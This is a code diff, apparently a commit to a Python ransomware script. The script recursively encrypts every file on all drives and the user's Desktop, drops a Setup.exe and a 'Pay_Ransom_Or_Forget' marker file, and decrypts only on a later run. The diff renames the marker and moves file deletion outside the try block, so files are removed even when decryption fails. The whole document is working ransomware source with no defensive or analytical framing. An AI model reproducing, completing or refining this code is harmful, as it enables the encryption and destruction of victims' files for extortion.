@@ -70,22 +70,22 @@ def start_encrypting():
   for drive in drives:
     for subdir, dirs, files in os.walk(drive+":/"):
         for file in files:
-            print "Encrypting "+os.path.join(subdir, file)
             try:
+              print "Encrypting "+os.path.join(subdir, file)
               encrypt(getKey(password),os.path.join(subdir, file))              
             except Exception as e:
               print e
   for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
       for file in files:
-          print "Encrypting "+os.path.join(subdir, file)
           try:
+            print "Encrypting "+os.path.join(subdir, file)
             encrypt(getKey(password),os.path.join(subdir, file))              
           except Exception as e:
             print e
 
   shutil.copy("Setup.exe","C:/Users/"+getpass.getuser()+"/Desktop/Setup.exe")
-  f=open("D:/check.bat","w")
-  f.write("echo 'Pay Ransom'")
+  f=open("D:/Pay_Ransom_Or_Forget_check.bat","w")
+  f.write("dnsjknjknja")
   f.close()
 
 def start_decrypting():
@@ -98,27 +98,29 @@ def start_decrypting():
   for drive in drives:
     for subdir, dirs, files in os.walk(drive+":/"):
         for file in files:
-            print "Decrypting "+os.path.join(subdir, file)
             if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
               try:
+                print "Decrypting "+os.path.join(subdir, file)
                 decrypt(getKey(password),os.path.join(subdir, file))
-                os.remove(os.path.join(subdir, file))
               except Exception as e:
                 print e
+              os.remove(os.path.join(subdir, file))
+
 
   for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
       for file in files:
-          print "Decrypting "+os.path.join(subdir, file)
           if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
             try:
+              print "Decrypting "+os.path.join(subdir, file)
               decrypt(getKey(password),os.path.join(subdir, file))
-              os.remove(os.path.join(subdir, file))              
             except Exception as e:
               print e
+            os.remove(os.path.join(subdir, file))              
+
 
 
 if __name__ == '__main__':
-  if os.path.isfile("D:/check.bat"):
+  if os.path.isfile("D:/Pay_Ransom_Or_Forget_check.bat"):
     print "Decrypting"
     start_decrypting()
   else:
